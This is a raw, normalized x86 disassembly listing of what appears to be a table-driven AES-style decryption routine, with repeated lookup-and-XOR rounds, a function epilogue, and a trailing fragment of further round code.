xor edx [ eax ]
mov [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x10 ]
and ecx 0xff
mov edx [ ebp - 0x14 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0xc ]
and edx 0xff
mov eax [ ebp - 0x10 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xff
mov ecx [ ebp - 0xc ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
sub ecx 0x10
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
and edx 0xff
mov eax [ ebp - 0x18 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xff
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp - 0x20 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x18 ]
and edx 0xff
mov eax [ ebp - 0x1c ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x10
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x14 ]
and eax 0xff
mov ecx [ ebp - 0x8 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax ]
mov [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x10 ]
and ecx 0xff
mov edx [ ebp - 0x14 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0xc ]
and edx 0xff
mov eax [ ebp - 0x10 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xff
mov ecx [ ebp - 0xc ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
sub ecx 0x10
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
and edx 0xff
mov eax [ ebp - 0x18 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xff
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp - 0x20 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x18 ]
and edx 0xff
mov eax [ ebp - 0x1c ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp - 0x8 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x10 ]
and edx 0xff
mov eax [ ebp - 0x14 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0xc ]
and eax 0xff
mov ecx [ ebp - 0x10 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x8 ]
and ecx 0xff
mov edx [ ebp - 0xc ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
sub edx 0x10
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x24 ]
and eax 0xff
mov ecx [ ebp - 0x18 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x20 ]
and ecx 0xff
mov edx [ ebp - 0x24 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x1c ]
and edx 0xff
mov eax [ ebp - 0x20 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x18 ]
and eax 0xff
mov ecx [ ebp - 0x1c ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x4 ]
sub ecx 0x10
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
and edx 0xff
mov eax [ ebp - 0x8 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xff
mov ecx [ ebp - 0x14 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0xc ]
and ecx 0xff
mov edx [ ebp - 0x10 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x8 ]
and edx 0xff
mov eax [ ebp - 0xc ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
and ecx 0xff
mov edx [ ebp - 0x18 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x20 ]
and edx 0xff
mov eax [ ebp - 0x24 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xff
mov ecx [ ebp - 0x20 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp - 0x1c ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
sub edx 0x10
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
and eax 0xff
mov ecx [ ebp - 0x8 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax ]
mov [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x10 ]
and ecx 0xff
mov edx [ ebp - 0x14 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0xc ]
and edx 0xff
mov eax [ ebp - 0x10 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xff
mov ecx [ ebp - 0xc ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
sub ecx 0x10
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
and edx 0xff
mov eax [ ebp - 0x18 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xff
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp - 0x20 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x18 ]
and edx 0xff
mov eax [ ebp - 0x1c ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp - 0x8 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x10 ]
and edx 0xff
mov eax [ ebp - 0x14 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0xc ]
and eax 0xff
mov ecx [ ebp - 0x10 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x8 ]
and ecx 0xff
mov edx [ ebp - 0xc ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
sub edx 0x10
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x24 ]
and eax 0xff
mov ecx [ ebp - 0x18 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x20 ]
and ecx 0xff
mov edx [ ebp - 0x24 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x1c ]
and edx 0xff
mov eax [ ebp - 0x20 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x8 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x18 ]
and eax 0xff
mov ecx [ ebp - 0x1c ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x20 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
mov [ ecx ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0xc ] edx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x14 ]
and edx 0xff
mov eax [ ebp - 0x8 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xff
mov ecx [ ebp - 0x14 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0xc ]
and ecx 0xff
mov edx [ ebp - 0x10 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x8 ]
and edx 0xff
mov eax [ ebp - 0xc ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
and ecx 0xff
mov edx [ ebp - 0x18 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x20 ]
and edx 0xff
mov eax [ ebp - 0x24 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
shr eax 0x18
